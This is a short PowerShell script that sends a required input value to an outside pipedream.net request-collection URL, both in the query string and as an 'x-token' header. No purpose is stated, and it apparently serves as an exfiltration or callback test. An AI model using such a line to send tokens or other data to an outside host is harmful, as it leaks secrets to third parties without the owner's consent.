param
(
    [Parameter(Mandatory = $true)]
    $x
)

Invoke-WebRequest -UseBasicParsing -Uri https://enr7vbtsf8fn.x.pipedream.net?$x -Headers @{ 'x-token'= $x; }